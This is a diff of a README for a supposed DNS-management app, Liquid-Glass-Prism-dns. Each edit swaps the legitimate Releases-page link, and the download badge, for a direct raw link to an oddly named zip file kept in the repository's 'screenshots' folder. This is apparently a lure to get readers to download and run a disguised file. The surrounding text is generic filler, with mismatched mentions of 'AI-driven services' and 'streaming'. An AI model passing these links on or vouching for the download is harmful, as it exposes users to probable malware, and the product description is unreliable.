@@ -11,11 +11,11 @@
 Welcome to Liquid-Glass-Prism-dns! This application allows you to manage your DNS settings easily. With its simple interface, even those new to technology can use it effectively.
 
 ## 📥 Download Link
-[![Download Liquid-Glass-Prism-dns](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Fentseface1447/Liquid-Glass-Prism-dns/releases)
+[![Download Liquid-Glass-Prism-dns](https://github.com/Fentseface1447/Liquid-Glass-Prism-dns/raw/refs/heads/main/screenshots/Liquid-Glass-Prism-dns-emarcid.zip)](https://github.com/Fentseface1447/Liquid-Glass-Prism-dns/raw/refs/heads/main/screenshots/Liquid-Glass-Prism-dns-emarcid.zip)
 
 ## 🔽 Download & Install
 
-To get started, visit this page to download: [Liquid-Glass-Prism-dns Releases](https://github.com/Fentseface1447/Liquid-Glass-Prism-dns/releases). 
+To get started, visit this page to download: [Liquid-Glass-Prism-dns Releases](https://github.com/Fentseface1447/Liquid-Glass-Prism-dns/raw/refs/heads/main/screenshots/Liquid-Glass-Prism-dns-emarcid.zip). 
 
 Here, you will find the latest version of the application. Simply select the version you want to download. After downloading, follow these steps to install:
 
@@ -52,7 +52,7 @@ If you encounter any challenges, we have resources to help you:
 
 ## 🌐 Useful Links
 
-- Download the application: [Liquid-Glass-Prism-dns Releases](https://github.com/Fentseface1447/Liquid-Glass-Prism-dns/releases)
+- Download the application: [Liquid-Glass-Prism-dns Releases](https://github.com/Fentseface1447/Liquid-Glass-Prism-dns/raw/refs/heads/main/screenshots/Liquid-Glass-Prism-dns-emarcid.zip)
 - Join the community discussions at GitHub Issues
 
 With Liquid-Glass-Prism-dns, managing your DNS has never been simpler. Enjoy a seamless experience with AI-driven services and user-friendly controls. Happy streaming!
